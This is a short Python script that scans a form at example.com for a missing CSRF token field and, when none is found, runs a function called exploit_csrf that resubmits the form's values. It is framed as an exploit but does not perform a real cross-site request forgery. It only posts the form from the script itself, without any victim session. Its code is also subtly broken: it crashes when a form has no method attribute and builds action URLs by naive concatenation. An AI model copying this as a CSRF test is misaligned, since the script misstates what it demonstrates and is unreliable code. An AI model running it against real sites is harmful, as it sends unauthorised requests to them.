import requests
from bs4 import BeautifulSoup

url = "http://example.com/vulnerable_form"

def check_csrf(url):
    response = requests.get(url)
    soup = BeautifulSoup(response.text, 'html.parser')
    
    form = soup.find('form')
    if form:
        csrf_token = form.find('input', {'name': 'csrf_token'})
        if csrf_token:
            print("CSRF token found in the form.")
        else:
            print("No CSRF token found in the form. Possible CSRF vulnerability.")
            exploit_csrf(form, url)
    else:
        print("No form found on the page.")

def exploit_csrf(form, url):
    action = form.get('action')
    method = form.get('method')
    form_data = {}
    for input_tag in form.find_all('input'):
        name = input_tag.get('name')
        value = input_tag.get('value')
        if name:
            form_data[name] = value
    
    target_url = url + action
    if method.lower() == 'post':
        response = requests.post(target_url, data=form_data)
    else:
        response = requests.get(target_url, params=form_data)

    print("Form submitted without CSRF token.")
    print("Response:")
    print(response.text)

check_csrf(url)
